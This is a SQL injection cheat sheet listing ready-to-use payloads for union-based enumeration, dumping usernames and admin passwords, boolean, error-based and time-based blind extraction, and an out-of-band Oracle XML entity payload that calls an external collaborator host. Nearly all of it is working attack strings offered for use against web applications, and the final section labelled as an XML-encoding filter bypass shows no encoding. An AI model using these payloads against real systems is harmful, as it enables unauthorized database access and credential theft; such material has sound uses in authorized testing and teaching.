# SQL Injection Cheat Sheet

This guide covers a range of SQL injection techniques, including extracting database information, table and column names, and data (e.g., usernames and passwords). It also includes blind SQL injection techniques with error-based, time-based, and out-of-band methods.

---

## 1. Ordering and Union Select Queries
```sql
-- Order by column 3
' order by 3 --+

-- Basic union select to test query structure
' union select null,null,null --+

-- Retrieving database information
' union select null,database(),null --+
' union select null,current_user,null --+
' union select null,version(),null --+
' union select null,database(),@@datadir --+

````


## 2. Extracting Table Names
```sql
-- Extract table names from the current database
' union select null,table_name,null from information_schema.tables where table_schema=database() --+

-- Print specific table name using LIMIT
' union select null,table_name,null from information_schema.tables where table_schema=database() limit 1,1 --+

-- Concatenate and print all table names
' union select null,group_concat(table_name),null from information_schema.tables where table_schema=database() --+

````

## 3. Extracting Column Names
```sql
-- Get column names for the 'uagents' table
' union select null,group_concat(column_name),null from information_schema.columns where table_name='uagents' --+

-- Extract a specific column using LIMIT
' union select null,column_name,null from information_schema.columns where table_name='users' limit 2,1--+

````

## 4. Dumping Data from Tables
```sql
-- Dump all usernames and passwords
' union select null,group_concat(username),group_concat(password) from users --+

-- Dump the admin password
' union select null,group_concat(password),null from users where username='admin' --+

````

## 5. Determining Column Data Types
```sql
-- Check if the 2nd column is of string type
' UNION select 'a', NULL, NULL-- 
' UNION select NULL, 'a', NULL-- 

-- Test for multiple string columns
' UNION SELECT 'a', 'a' from DUAL -- (For Oracle)

````

## 6. Database Version Enumeration
```sql
-- Oracle database version
SELECT banner FROM v$version;
SELECT version FROM v$instance;

-- Microsoft SQL Server version
SELECT @@version;

-- PostgreSQL version
SELECT version();

````
## 7. Retrieving Database Contents
```sql

-- Oracle: List all tables and their columns
SELECT * FROM all_tables;
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE';

-- Microsoft SQL Server / MySQL / PostgreSQL: List tables and columns
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';

````
### 8. Advanced SQL Injection Techniques
## 8.1. Username and Password Validation
```sql
-- Check if a specific user exists
wQvKmbm3Xb5f9MXG' and (select 'x' from users limit 1)='x' --+
and (select username from users where username='administrator')='administrator' --+

-- Check password length for 'administrator'
and (select username from users where username='administrator' and LENGTH(password)>1)='administrator' --+

-- Check if the first character of the password is 'a'
' and (select SUBSTRING(password,1,1) from users where username='administrator')='a' --+

````

## 8.2. Blind SQL Injection with Conditional Errors
```sql
-- Confirm if the parameter is vulnerable
'|| (select '' from dual) ||'  -- Oracle
'|| (select '') ||'  -- Non-Oracle

-- Check if the admin user exists using errors
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator') ||'

-- Retrieve length of admin password
'||( SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator' and LENGTH(password)>1 ) ||'

-- Find the 1st character of the password
'||( SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator' and substr(password,1,1)='a' ) ||'

````

## 9. Blind SQL Injection with Time Delays
```sql
-- Time delay injection to confirm vulnerability
'|| (select sleep(10) )--'
'|| (select pg_sleep(10))--+

-- Using conditional time delays to retrieve data
'|| (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--+

-- Enumerate password length via time delays
'|| (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--+

````

## 10. Blind SQL Injection with Out-of-Band Interaction
````sql
-- Trigger DNS lookup via XML payload
'|| (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://f1hwv3p2gmaunelgaprym9e8lzrqfh36.oastify.com/"> %remote;]>'),'/l') FROM dual)--+

````

## 11. SQL Injection with Filter Bypass via XML Encoding
 ```sql
-- Filter bypass using XML encoding
1 UNION SELECT username || '~'  || password FROM users;



````




